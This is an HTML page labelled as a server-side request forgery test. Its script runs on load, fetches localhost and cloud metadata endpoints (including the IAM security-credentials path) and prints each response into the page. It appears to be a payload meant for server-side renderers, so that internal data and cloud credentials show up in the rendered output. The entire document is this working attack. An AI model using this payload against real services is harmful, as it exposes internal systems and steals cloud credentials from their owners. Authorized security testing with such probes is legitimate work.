<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>SSRF Test Page</title>
<style>
  body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
  h1 { color: #afa; }
  pre { background: #222; padding: 1em; border-radius: 5px; max-height: 300px; overflow-y: auto; }
  .target-block { margin-bottom: 2em; }
</style>
</head>
<body>
  <h1>SSRF Server-Side Request Forgery Tests</h1>
  <div id="results">Running tests...</div>

<script>
(async () => {
  const targets = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  ];

  const resultsDiv = document.getElementById("results");
  resultsDiv.innerHTML = "";

  for (const url of targets) {
    const block = document.createElement("div");
    block.className = "target-block";
    block.innerHTML = `<h2>Testing: ${url}</h2><pre>Loading...</pre>`;
    resultsDiv.appendChild(block);
    
    try {
      const res = await fetch(url, { method: 'GET' });
      if (res.ok) {
        const text = await res.text();
        block.querySelector("pre").textContent = `Response (first 1000 chars):\n\n${text.slice(0, 1000)}`;
      } else {
        block.querySelector("pre").textContent = `Failed with status: ${res.status} ${res.statusText}`;
      }
    } catch (e) {
      block.querySelector("pre").textContent = `Error: ${e.message}`;
    }
  }
})();
</script>
</body>
</html>
